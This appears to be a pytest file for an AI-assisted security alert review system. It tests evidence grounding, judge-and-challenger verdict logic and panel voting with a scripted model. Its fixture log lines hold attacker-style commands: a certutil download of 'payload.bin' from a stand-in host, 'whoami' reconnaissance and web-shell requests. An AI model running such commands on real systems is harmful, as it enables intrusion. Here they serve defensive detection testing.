"""Grounding, the judge protocol with a real Challenger, and panel aggregation.

The scripted client stands in for the model: what is under test is the CODE around the model --
what survives grounding, how verdicts combine, that reasoning is never switched off."""

from __future__ import annotations

import json
from collections.abc import Mapping, Sequence
from typing import Any

import pytest

from portal.modules.security.core.review import grounding, judge, panel
from portal.modules.security.core.review.contracts import (
    Channel,
    Claim,
    EvidenceRef,
    JudgeRecord,
    Outcome,
    ReviewConcern,
    Verdict,
)
from portal.modules.security.core.review.intake import EventView, IntakeResult

E1 = "wineventlog:aaa111"
E2 = "wineventlog:bbb222"
E3 = "web:access:ccc333"
TEXTS = {
    E1: "host=WKS05 user=evil cmd=certutil -urlcache -f http://x/payload.bin",
    E2: "host=WKS05 user=evil cmd=whoami /all",
    E3: "clientip=10.9.9.9 uri=/upload.php?cmd=whoami status=200",
}


def window(extra: Mapping[str, str] | None = None) -> IntakeResult:
    events = {
        i: EventView(i, i.rsplit(":", 1)[0], float(n), t) for n, (i, t) in enumerate(TEXTS.items())
    }
    for n, (i, t) in enumerate((extra or {}).items()):
        events[i] = EventView(i, i.rsplit(":", 1)[0], 100.0 + n, t)
    return IntakeResult(events=events)


def concern(*ids: str) -> ReviewConcern:
    return ReviewConcern(
        concern_id="cn-1",
        unit_id="u1",
        level="L2_ENTITY",
        outcome=Outcome.COUSIN,
        channels=(Channel.KNOWN_SIMILAR,),
        priority_p=0.004,
        source_ids=("wineventlog",),
        span_seconds=120.0,
        evidence=tuple(EvidenceRef(i, i.rsplit(":", 1)[0]) for i in (ids or (E1, E2))),
    )


def j(**kw: Any) -> str:
    return json.dumps(kw)


def conclude(verdict: str, *claims: dict[str, Any], confidence: float = 0.8) -> str:
    return j(action="conclude", verdict=verdict, confidence=confidence, claims=list(claims))


GOOD_CLAIM = {
    "text": "certutil fetches a remote binary",
    "evidence_ids": [E1],
    "quote": "CERTUTIL -urlcache",
}


class Scripted:
    def __init__(self, *replies: str | judge.ModelReply) -> None:
        self.replies = list(replies)
        self.calls: list[dict[str, Any]] = []

    def complete(
        self,
        messages: Sequence[Mapping[str, str]],
        *,
        model: str,
        schema: Mapping[str, Any] | None,
        max_tokens: int,
        think: bool,
    ) -> judge.ModelReply:
        self.calls.append(
            {"model": model, "think": think, "messages": len(messages), "schema": schema}
        )
        item = self.replies.pop(0)
        return item if isinstance(item, judge.ModelReply) else judge.ModelReply(text=item)


class Tools:
    def __init__(self, found: Sequence[tuple[str, str]]) -> None:
        self.found = list(found)
        self.terms: list[str] = []

    def pivot(self, term: str) -> Sequence[tuple[str, str]]:
        self.terms.append(term)
        return self.found


# ── parsing ──────────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "text",
    [
        '{"a": 1}',
        '```json\n{"a": 1}\n```',
        '<think>hmm {not json}</think>{"a": 1}',
        'Sure! Here you go: {"a": 1} hope that helps',
        '{"a": 1} trailing {"b": 2}',
    ],
)
def test_parse_json_object_tolerates_wrappers(text: str) -> None:
    assert judge.parse_json_object(text) == {"a": 1}


def test_parse_json_object_handles_braces_in_strings_and_rejects_garbage() -> None:
    assert judge.parse_json_object('x {"t": "a } b { c", "n": 2} y') == {"t": "a } b { c", "n": 2}
    assert judge.parse_json_object("no json here") is None
    assert judge.parse_json_object("[1, 2]") is None


# ── grounding ────────────────────────────────────────────────────────────────


def test_grounding_keeps_only_claims_a_checker_can_locate() -> None:
    claims = [
        Claim("ok", (E1,)),
        Claim("quote ok, case and spacing differ", (E1,), quote="CERTUTIL   -urlcache"),
        Claim("quote missing", (E1,), quote="mimikatz sekurlsa"),
        Claim("unknown id", ("web:access:nope",)),
        Claim("no evidence", ()),
        Claim("", (E1,)),
        Claim("short quote", (E1,), quote="cer"),
    ]
    report = grounding.verify_claims(claims, TEXTS)
    assert [c.text for c in report.kept] == ["ok", "quote ok, case and spacing differ"]
    reasons = {c.text: r for c, r in report.dropped}
    assert reasons["quote missing"] == "quote_not_found"
    assert reasons["unknown id"].startswith("unknown_evidence:")
    assert reasons["no evidence"] == "no_evidence" and reasons[""] == "empty_text"
    assert reasons["short quote"] == "quote_too_short"
    assert report.cited == 6 and report.resolved == 5
    assert report.citation_resolution == pytest.approx(5 / 6)


def test_parse_claims_reports_malformed_entries() -> None:
    claims, bad = grounding.parse_claims(
        [
            {"text": "a", "evidence_ids": "x"},
            "oops",
            {"text": "b", "evidence_ids": [1, 2], "quote": " "},
        ]
    )
    assert [(c.text, c.evidence_ids, c.quote) for c in claims] == [
        ("a", ("x",), None),
        ("b", ("1", "2"), None),
    ]
    assert bad == 1
    assert grounding.parse_claims(None) == ([], 0)


# ── judge ────────────────────────────────────────────────────────────────────


def test_something_with_a_grounded_claim_and_an_upholding_challenger_is_something() -> None:
    client = Scripted(conclude("something", GOOD_CLAIM), j(stance="upheld", objections=[]))
    record = judge.run_judge(
        concern(), window(), client=client, model="judge-m", challenger_model="chal-m"
    )
    assert record.verdict == Verdict.SOMETHING and record.challenger_verdict == "upheld"
    assert [c.text for c in record.claims] == ["certutil fetches a remote binary"]
    assert [c["model"] for c in client.calls] == ["judge-m", "chal-m"]
    assert all(c["think"] is True for c in client.calls), "reasoning must never be switched off"
    assert record.evidence_shown == 2 and record.evidence_total == 2 and record.degraded == ""


def test_something_without_a_grounded_claim_becomes_unsure() -> None:
    bad = {"text": "scary", "evidence_ids": ["web:access:invented"]}
    client = Scripted(conclude("something", bad), j(stance="upheld"))
    record = judge.run_judge(concern(), window(), client=client, model="m")
    assert record.verdict == Verdict.UNSURE and record.dropped_claims == 1
    assert "without a grounded claim" in record.note


@pytest.mark.parametrize(
    ("stance", "objection", "expected"),
    [
        ("upheld", None, Verdict.NOTHING),
        ("insufficient", None, Verdict.UNSURE),
        ("refuted", {"text": "it fetches a binary", "evidence_ids": [E1]}, Verdict.UNSURE),
        ("refuted", {"text": "invented", "evidence_ids": ["nope"]}, Verdict.UNSURE),
    ],
)
def test_nothing_needs_independent_agreement(
    stance: str, objection: dict[str, Any] | None, expected: Verdict
) -> None:
    challenger = j(stance=stance, objections=[objection] if objection else [])
    record = judge.run_judge(
        concern(), window(), client=Scripted(conclude("nothing"), challenger), model="m"
    )
    assert record.verdict == expected


def test_something_yields_only_to_a_grounded_refutation() -> None:
    grounded = j(stance="refuted", objections=[{"text": "scheduled task", "evidence_ids": [E2]}])
    ungrounded = j(stance="refuted", objections=[{"text": "trust me", "evidence_ids": ["nope"]}])
    down = judge.run_judge(
        concern(), window(), client=Scripted(conclude("something", GOOD_CLAIM), grounded), model="m"
    )
    assert down.verdict == Verdict.UNSURE and "grounded objection" in down.note
    kept = judge.run_judge(
        concern(),
        window(),
        client=Scripted(conclude("something", GOOD_CLAIM), ungrounded),
        model="m",
    )
    assert kept.verdict == Verdict.SOMETHING and "raised anyway" in kept.note


def test_an_unavailable_challenger_never_silences() -> None:
    erroring = judge.ModelReply(text="", error="timeout")
    record = judge.run_judge(
        concern(), window(), client=Scripted(conclude("nothing"), erroring), model="m"
    )
    assert record.verdict == Verdict.UNSURE and record.challenger_verdict == "unavailable"
    raised = judge.run_judge(
        concern(), window(), client=Scripted(conclude("something", GOOD_CLAIM), erroring), model="m"
    )
    assert raised.verdict == Verdict.SOMETHING


def test_a_pivot_extends_what_may_be_cited() -> None:
    new = "web:access:ddd444"
    tools = Tools([(new, "clientip=10.9.9.9 uri=/shell.php"), (E1, TEXTS[E1])])
    cite_new = {"text": "same actor drops a shell", "evidence_ids": [new], "quote": "/shell.php"}
    client = Scripted(
        j(action="pivot", term="10.9.9.9", why="same actor?"),
        conclude("something", cite_new),
        j(stance="upheld"),
    )
    record = judge.run_judge(concern(), window(), client=client, model="m", tools=tools)
    assert (
        tools.terms == ["10.9.9.9"] and record.verdict == Verdict.SOMETHING and record.rounds == 2
    )
    assert record.claims[0].evidence_ids == (new,)


def test_a_pivot_request_without_tools_is_answered_not_obeyed() -> None:
    client = Scripted(j(action="pivot", term="x"), conclude("unsure"), j(stance="insufficient"))
    record = judge.run_judge(concern(), window(), client=client, model="m", tools=None)
    assert record.verdict == Verdict.UNSURE and record.degraded == ""


def test_model_errors_and_unparseable_replies_degrade_to_unsure() -> None:
    err = judge.run_judge(
        concern(), window(), client=Scripted(judge.ModelReply("", error="boom")), model="m"
    )
    assert err.verdict == Verdict.UNSURE and err.degraded == "model error: boom"
    twice = judge.run_judge(concern(), window(), client=Scripted("nope", "still nope"), model="m")
    assert twice.degraded == "model returned no JSON object twice"
    repaired = judge.run_judge(
        concern(),
        window(),
        client=Scripted("nope", conclude("something", GOOD_CLAIM), j(stance="upheld")),
        model="m",
    )
    assert repaired.verdict == Verdict.SOMETHING and repaired.degraded == ""
    exhausted = judge.run_judge(
        concern(),
        window(),
        client=Scripted(*[j(action="pivot", term="a")] * 3),
        model="m",
        tools=Tools([]),
        max_rounds=3,
    )
    assert exhausted.degraded == "no conclusion within the round budget"


def test_the_case_text_cites_ids_caps_events_and_registers_only_what_it_shows() -> None:
    text, registry, total = judge.render_case(concern(E1, E2, E3), window(), max_events=2)
    assert total == 3 and set(registry) == {E1, E2}
    assert f"[{E1}]" in text and f"[{E3}]" not in text and "showing 2 of 3" in text
    assert "RESEMBLES" not in text and "EXISTING DETECTION: INDETERMINATE" in text


def test_combine_lattice_is_exhaustive() -> None:
    cases = {
        (Verdict.UNSURE, "upheld", 0): Verdict.UNSURE,
        (Verdict.SOMETHING, "upheld", 0): Verdict.SOMETHING,
        (Verdict.SOMETHING, "refuted", 1): Verdict.UNSURE,
        (Verdict.SOMETHING, "refuted", 0): Verdict.SOMETHING,
        (Verdict.SOMETHING, "", 0): Verdict.SOMETHING,
        (Verdict.NOTHING, "upheld", 0): Verdict.NOTHING,
        (Verdict.NOTHING, "refuted", 2): Verdict.UNSURE,
        (Verdict.NOTHING, "insufficient", 0): Verdict.UNSURE,
        (Verdict.NOTHING, "", 0): Verdict.UNSURE,
    }
    for (verdict, stance, objections), expected in cases.items():
        assert judge.combine(verdict, stance, objections)[0] == expected


def test_prompt_digest_is_stable() -> None:
    assert judge.prompt_digest() == judge.prompt_digest() and len(judge.prompt_digest()) == 12


# ── panel ────────────────────────────────────────────────────────────────────


def rec(model: str, verdict: Verdict, *, degraded: str = "") -> JudgeRecord:
    claims = (Claim("shared claim", (E1,)),) if verdict == Verdict.SOMETHING else ()
    return JudgeRecord(
        model=model, verdict=verdict, confidence=0.7, claims=claims, degraded=degraded
    )


POLICY = panel.PanelPolicy(minimum_participation=0.6, quorum=0.5)


def test_panel_needs_a_quorum_of_voters() -> None:
    out = panel.panel_verdict(
        [rec("a", Verdict.SOMETHING), rec("b", Verdict.SOMETHING), rec("c", Verdict.UNSURE)], POLICY
    )
    assert out.verdict == Verdict.SOMETHING and out.panel["votes"]["SUPPORT"] == 2
    assert [c.text for c in out.claims] == ["shared claim"]


def test_a_split_or_thin_panel_is_unsure_and_never_silences() -> None:
    split = panel.panel_verdict(
        [rec("a", Verdict.SOMETHING), rec("b", Verdict.NOTHING), rec("c", Verdict.UNSURE)], POLICY
    )
    assert split.verdict == Verdict.UNSURE
    lone_nothing = panel.panel_verdict(
        [rec("a", Verdict.NOTHING), rec("b", Verdict.UNSURE), rec("c", Verdict.UNSURE)], POLICY
    )
    assert (
        lone_nothing.verdict == Verdict.UNSURE
        and "participation" in lone_nothing.panel["rationale"]
    )


def test_failed_members_do_not_shrink_the_roster() -> None:
    out = panel.panel_verdict(
        [
            rec("a", Verdict.NOTHING),
            rec("b", Verdict.UNSURE, degraded="timeout"),
            rec("c", Verdict.UNSURE, degraded="timeout"),
        ],
        POLICY,
    )
    assert out.verdict == Verdict.UNSURE
    assert panel.panel_verdict([], POLICY).verdict == Verdict.UNSURE
    assert (
        panel.panel_verdict([rec("a", Verdict.UNSURE, degraded="x")], POLICY).degraded
        == "every panel member failed"
    )


def test_run_panel_runs_each_member_and_aggregates() -> None:
    members = [
        (Scripted(conclude("nothing"), j(stance="upheld")), "m1"),
        (Scripted(conclude("nothing"), j(stance="upheld")), "m2"),
        (Scripted(conclude("something", GOOD_CLAIM), j(stance="upheld")), "m3"),
    ]
    out = panel.run_panel(concern(), window(), members=members, policy=POLICY)
    assert out.verdict == Verdict.NOTHING and out.panel["dissent"] == ["m2"]
    assert out.model == "panel:m1,m2,m3"
